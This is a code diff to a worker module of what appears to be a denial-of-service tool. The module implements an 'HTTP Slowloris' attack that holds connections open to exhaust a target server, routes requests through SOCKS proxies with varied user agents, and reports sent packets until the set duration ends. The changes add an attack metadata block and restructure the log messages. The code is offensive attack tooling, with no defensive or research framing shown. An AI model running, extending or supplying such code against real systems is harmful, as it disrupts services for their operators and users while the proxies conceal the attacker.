@@ -4,6 +4,13 @@ import { parentPort, workerData } from "worker_threads";
 
 import { randomString } from "../utils/randomUtils.js";
 
+export const info = {
+  id: "http_slowloris",
+  name: "HTTP Slowloris",
+  description: "Keeps connections open to exhaust server resources.",
+  supportedProtocols: ["socks4", "socks5"],
+};
+
 const startAttack = () => {
   const { target, proxies, userAgents, duration, packetDelay, packetSize } =
     workerData;
@@ -42,14 +49,27 @@ const startAttack = () => {
 
     req.on("error", (err) => {
       parentPort.postMessage({
-        log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${err.message}`,
+        log: {
+          key: "request_failed",
+          params: {
+            proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+            target: fixedTarget,
+            error: err.message,
+          },
+        },
         totalPackets,
       });
     });
 
     req.on("close", () => {
       parentPort.postMessage({
-        log: `⚠ Connection closed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
+        log: {
+          key: "connection_closed",
+          params: {
+            proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+            target: fixedTarget,
+          },
+        },
         totalPackets,
       });
     });
@@ -59,7 +79,13 @@ const startAttack = () => {
 
     totalPackets++;
     parentPort.postMessage({
-      log: `✅ Request sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
+      log: {
+        key: "request_sent",
+        params: {
+          proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+          target: fixedTarget,
+        },
+      },
       totalPackets,
     });
   };
@@ -69,7 +95,7 @@ const startAttack = () => {
 
     if (elapsedTime >= duration) {
       clearInterval(interval);
-      parentPort.postMessage({ log: "Attack finished", totalPackets });
+      parentPort.postMessage({ log: { key: "attack_finished" }, totalPackets });
       process.exit(0);
     }
 
